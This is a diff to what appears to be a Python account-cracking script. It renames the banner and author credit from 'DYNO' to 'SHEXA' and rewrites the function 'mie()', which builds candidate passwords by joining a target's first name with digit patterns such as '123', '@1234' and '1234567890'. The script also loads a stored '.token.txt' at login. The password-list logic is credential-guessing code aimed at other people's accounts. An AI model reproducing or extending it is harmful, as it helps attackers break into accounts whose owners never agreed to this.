@@ -138,25 +138,31 @@ def back():
 def none():
 	clear()
 	prints(nel(f"""\t {color_text} 
- {B2}(  _`\ ( )   ( )( ) ( )(  _  )
-{B2}| | ) |`\`\_/'/'| `\| || ( ) |
-{B2}| | | )  `\ /'  | , ` || | | |        5.1v
-{H2}| |_) |   | |   | |`\ || (_) |
- {H2}(____/'   (_)   (_) (_)(_____)
+
+   _____ __  _________  __ ___ 
+  / ___// / / / ____/ |/ //   |
+  \__ \/ /_/ / __/  |   // /| |
+ ___/ / __  / /___ /   |/ ___ |
+/____/_/ /_/_____//_/|_/_/  |_|
+                               
+
          Made By {M2}IRAQY {P2}Coder""",width=80,style=f"{color_panel}"))
 def info():
 	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
-{B2}│ {P2}Author : DYNO × OKENWA{B2} │{B2}│ {P2}Version : 5.1v{B2} │
+{B2}│ {P2}Author : SHEXA × OKENWA{B2} │{B2}│ {P2}Version : 5.1v{B2} │
 {B2}╰─────────────────────╯{B2}╰───────────────╯""")
 def banner():
 	clear()
 	prints(nel(f"""\t {color_text} 
-(  _`\ ( )   ( )( ) ( )(  _  )
-| | ) |`\`\_/'/'| `\| || ( ) |
-| | | )  `\ /'  | , ` || | | |          5.1v
-| |_) |   | |   | |`\ || (_) |
-(____/'   (_)   (_) (_)(_____)
-         Made By {M2}DYNO {P2}Coder""",width=80,style=f"{color_panel}"))
+
+   _____ __  _________  __ ___ 
+  / ___// / / / ____/ |/ //   |
+  \__ \/ /_/ / __/  |   // /| |
+ ___/ / __  / /___ /   |/ ___ |
+/____/_/ /_/_____//_/|_/_/  |_|
+                               
+
+         Made By {M2}SHEXA {P2}Coder""",width=80,style=f"{color_panel}"))
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -584,20 +590,27 @@ def mie():
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'1234567890')
-						pwv.append(frs+'12')
-						pwv.append(frs+'1122')
-						pwv.append(frs+'321')
-						pwv.append(frs+'54321')
+						pwv.append(frs+'12345'+frs)
+						pwv.append(frs+'123'+frs)
+						pwv.append(frs+'1234'+frs)
+						pwv.append('123456'+frs)
+						pwv.append('12345678'+frs)
+						pwv.append(frs+frs+'123')
+						pwv.append('123'+frs+frs)
+						pwv.append(frs+frs+'1234')
+						pwv.append(frs+frs+'12345')
+						pwv.append('123'+frs+'123')
 						pwv.append('123'+frs+'123')
 						pwv.append('1234'+frs+'1234')
 						pwv.append('12345'+frs+'12345')
 						pwv.append('123'+frs)
+						pwv.append(frs+' 123')
+						pwv.append(frs+'@123')
+						pwv.append(frs+'@1234')
+						pwv.append(frs+'@12345')
+						pwv.append(frs+' 1234')
+						pwv.append(frs+' 12345')
+						pwv.append(frs+'1234567890')
 						pwv.append('1234'+frs)
 						pwv.append('12345'+frs)
 				else:
@@ -605,20 +618,27 @@ def mie():
 						pwv.append(nmf)
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-						pwv.append(frs+'123456')
-						pwv.append(frs+'123456789')
-						pwv.append(frs+'1234567890')
-						pwv.append(frs+'12')
-						pwv.append(frs+'1122')
-						pwv.append(frs+'321')
-						pwv.append(frs+'54321')
+						pwv.append(frs+'12345'+frs)
+						pwv.append(frs+'123'+frs)
+						pwv.append(frs+'1234'+frs)
+						pwv.append('123456'+frs)
+						pwv.append('12345678'+frs)
+						pwv.append(frs+frs+'123')
+						pwv.append('123'+frs+frs)
+						pwv.append(frs+frs+'1234')
+						pwv.append(frs+frs+'12345')
 						pwv.append('123'+frs+'123')
 						pwv.append('1234'+frs+'1234')
 						pwv.append('12345'+frs+'12345')
 						pwv.append('123'+frs)
+						pwv.append('123'+frs)
+						pwv.append(frs+' 123')
+						pwv.append(frs+'@123')
+						pwv.append(frs+'@1234')
+						pwv.append(frs+'@12345')
+						pwv.append(frs+' 1234')
+						pwv.append(frs+' 12345')
+						pwv.append(frs+'1234567890')
 						pwv.append('1234'+frs)
 						pwv.append('12345'+frs)
 				if 'ya' in pwpluss:
